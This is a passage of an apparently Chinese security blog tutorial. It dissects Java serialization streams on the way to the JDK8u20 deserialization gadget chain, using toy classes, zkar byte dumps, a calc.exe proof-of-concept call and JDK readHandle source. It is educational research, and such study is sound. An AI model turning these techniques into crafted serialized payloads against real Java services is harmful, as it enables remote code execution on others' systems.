class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">20L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        input.defaultReadObject();<br>        <span class="hljs-keyword">try</span> &#123;<br>            input.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><strong>当传入<code>AnnotationInvocationHandler</code>方法中的<code>zero</code>等于<code>0</code>的时候，如何能在序列化结束时调用<code>AnnotationInvocationHandler.exec()</code>方法达到<code>RCE</code>？</strong></p>
<p>那么直接领zero&#x3D;0</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        AnnotationInvocationHandler handler=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationInvocationHandler</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;payload1.ser&quot;</span>));<br>        out.writeObject(handler);<br>        out.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload1.ser&quot;</span>));<br>        AnnotationInvocationHandler str=(AnnotationInvocationHandler)in.readObject();<br>        str.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>因为分母为零所以抛出了异常</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414230044740.png" srcset="/img/loading.gif" lazyload alt="image-20230414230044740"> </p>
<p>使用zkar分析产生的payload1</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415153240075.png" srcset="/img/loading.gif" lazyload alt="image-20230415153240075"> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\payload1&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">45</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">2d</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.AnnotationInvocationHandler - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">41</span> 6e 6e <span class="hljs-number">6f</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">49</span> 6e <span class="hljs-number">76</span> <span class="hljs-number">6f</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">48</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0a<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-meta">@Value</span> - zero - <span class="hljs-number">0x7a</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br>PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\payload1.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure>

<p>利用上面我们学到的知识，可以逐一分析反序列化协议构造流</p>
<p><code>STREAM_MAGIC - 0xac ed</code>是魔数，代表了序列化的格式；</p>
<p><code>STREAM_VERSION - 0x00 05</code>表示序列化的版本；</p>
<p><code>Contents</code>表示最终生成的序列的内容；</p>
<p><code>TC_OBJECT - 0x73</code>表示序列化一个新对象的开始标记；</p>
<p><code>TC_CLASSDESC - 0x72</code>表示一个新类的描述信息开始标记；</p>
<p><code>className</code>表示当前对象的类全名信息，下面紧跟着的内容也是<code>className</code>的描述信息；</p>
<p><code>Length - 45 - 0x00 2d</code>表示当前对象的类的长度为<code>45</code>；</p>
<p><code>Value - ysoserial.jdk8u20.AnnotationInvocationHandler - 0x79 73 6f 73 65 72 69 61 6c 2e 6a 64 6b 38 75 32 30 2e 41 6e 6e 6f 74 61 74 69 6f 6e 49 6e 76 6f 63 61 74 69 6f 6e 48 61 6e 64 6c 65 72</code>表示当前对象的类的名称为<code>ysoserial.jdk8u20.AnnotationInvocationHandler</code>，后面的字符串是其十六进制表示；</p>
<p><code>serialVersionUID - 0x00 00 00 00 00 00 00 0a</code>定义了<code>serialVersionUID</code>的值为<code>20</code>；</p>
<p><code>Handler - 8257536</code> 表示为对象分配一个值为<code>007e0000</code>的<code>handle</code>（因为引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增,而8257536正好就是0x7E0000），值得注意的是这里的<code>handle</code>实际上没有被真正的写入文件，如果我们把这里的<code>007e0000</code>加入到序列化数据中，会发生异常，从而终止反序列化进程，之所以会在这里显示出来，是因为<code>serializationDumper</code>的作者为了方便使用者分析序列化数据的结构；</p>
<p><code>classDescFlags - 0x02 - SC_SERIALIZABLE</code>表示类描述信息标记为<code>SC_SERIALIZABLE</code>，代表在序列化的时候使用的是<code>java.io.Serializable</code>（如果使用的是<code>java.io.Externalizable</code>，这里的标记就会变成<code>classDescFlags - 0x04 - SC_EXTERNALIZABLE</code>）；</p>
<p><code>fieldCount - 1 - 0x00 01</code>表示成员属性的数量为1，值得注意的是这里的<code>fieldCount</code>同样是<code>serializationDumper</code>的作者为了方便使用者分析序列化数据的结构而新设置的描述符，在官方序列化规范中是没有<code>fieldCount</code>的；</p>
<p><code>Fields</code>表示接下来的内容是类中所有字段的描述信息，<code>Fields</code>成员属性保存了当前分析的类对应的所有成员属性的元数据信息，它是一个数组结构，每一个元素都对应了成员属性的元数据描述信息，且不会重复；</p>
<p><code>0</code>表示接下来的内容是第一个字段的描述信息；</p>
<p><code>Int - I - 0x49</code>表示该字段的类型是<code>int</code>型；</p>
<p><code>fieldName</code>表示当前字段的字段名信息，下面紧跟着的内容也是<code> fieldName</code>的描述信息；</p>
<p><code>Length - 4 - 0x00 04</code>表示当前字段名的长度为<code>4</code>；</p>
<p><code>Value - zero - 0x7a65726f</code>表示当前字段名为<code>zero</code>；</p>
<p><code>classAnnotations</code>表示和类相关的<code>Annotation</code>的描述信息，这里的数据值一般是由<code>ObjectOutputStream</code>的<code>annotateClass()</code>方法写入的，但由于<code>annotateClass()</code>方法默认为空，所以<code>classAnnotations</code>后一般会设置<code>TC_ENDBLOCKDATA</code>标识；（关于<code>annotateClass</code>具体可以看我写的<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/893.html">序列化流程分析总结</a>一文）</p>
<p><code>TC_ENDBLOCKDATA - 0x78</code>数据块的结束标记，表示这个对象类型的描述符已经结束了；</p>
<p><code>superClassDesc</code>表示父类的描述符信息，这里为空；</p>
<p><code>TC_NULL - 0x70</code>表示当前对象是一个空引用；</p>
<p><code>newHandle 0x00 7e 00 01</code>表示为对象分配一个值为<code>007e0001</code>的<code>handle</code>，同上面的<code>newHandle</code>一样，这里的<code>handle</code>实际上没有被真正的写入文件；</p>
<p><code>classdata</code>表示下面紧跟着的是类数据中的所有内容；</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-keyword">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          zero<br>            (integer)<span class="hljs-number">0</span> - <span class="hljs-number">0</span>x00 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">//这里表示zero的值为1</span><br></code></pre></td></tr></table></figure>

<p>以上就是所有的序列化数据的结构，当进行反序列化的时候，会依次从上到下读取序列化内容进行还原数据。</p>
<p><strong>如果在序列化的时候插入一段源码中没有的数据，在反序列化时会发生什么</strong></p>
<h3 id="双重writeObject"><a href="#双重writeObject" class="headerlink" title="双重writeObject"></a>双重writeObject</h3><p>首先先分析将同一段代码一次序列化和两次序列化以后他们之间的区别</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID=<span class="hljs-number">100L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        input.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">DoubleSerialize</span> <span class="hljs-variable">doubleSerialize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleSerialize</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;double1.ser&quot;</span>));<br>        oos.writeObject(doubleSerialize);<br>        oos.close();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>一次序列化以后产生的文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\double1.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">33</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">21</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.DoubleSerialize - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">44</span> <span class="hljs-number">6f</span> <span class="hljs-number">75</span> <span class="hljs-number">62</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c <span class="hljs-number">69</span> 7a <span class="hljs-number">65</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">100</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.DoubleSerialize<br>        &#123;&#125;Attributes<br><br></code></pre></td></tr></table></figure>

<p>修改代码后使其二次序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID=<span class="hljs-number">100L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        input.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">DoubleSerialize</span> <span class="hljs-variable">doubleSerialize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleSerialize</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;double2.ser&quot;</span>));<br>        oos.writeObject(doubleSerialize);<br>        oos.writeObject(doubleSerialize);<br>        oos.close();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\double2.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">33</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">21</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.DoubleSerialize - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">44</span> <span class="hljs-number">6f</span> <span class="hljs-number">75</span> <span class="hljs-number">62</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c <span class="hljs-number">69</span> 7a <span class="hljs-number">65</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">100</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.DoubleSerialize<br>        &#123;&#125;Attributes<br>  TC_REFERENCE - <span class="hljs-number">0x71</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br><br></code></pre></td></tr></table></figure>

<p>发现多了这一个地方</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">TC_REFERENCE - <span class="hljs-number">0x71</span><br>  <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>  <br></code></pre></td></tr></table></figure>

<p>这里对应的就是前文基础知识里“序列化中的两个机制”中引用机制里的一段话</p>
<blockquote>
<p>每一个写入字节流的对象都会被赋予引用<code>Handle</code>，并且这个引用<code>Handle</code>可以反向引用该对象（使用<code>TC_REFERENCE</code>结构，引用前面handle的值），引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从<code>0x7E0000</code>开始。</p>
</blockquote>
<p>那么反序列化是如何处理<code>TC_REFERENCE</code>块的呢？</p>
<p>在<code>readObject0</code>方法里有这样的一个判断：</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">case</span> TC_REFERENCE:<br>	<span class="hljs-keyword">return</span> readHandle(unshared)<br></code></pre></td></tr></table></figure>

<p>是的，在反序列化的流程中，进入了<code>readObject0</code>方法后，会判断读取的字节流中是否有<code>TC_REFERENCE</code>标识，如果有，那么会调用<code>readHandle</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">readHandle</span><span class="hljs-params">(<span class="hljs-type">boolean</span> unshared)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-keyword">if</span> (bin.readByte() != TC_REFERENCE) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>();<br>       &#125;<br>       passHandle = bin.readInt() - baseWireHandle;<br>       <span class="hljs-keyword">if</span> (passHandle &lt; <span class="hljs-number">0</span> || passHandle &gt;= handles.size()) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>               String.format(<span class="hljs-string">&quot;invalid handle value: %08X&quot;</span>, passHandle +<br>               baseWireHandle));<br>       &#125;<br>       <span class="hljs-keyword">if</span> (unshared) &#123;<br>           <span class="hljs-comment">// REMIND: what type of exception to throw here?</span><br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title 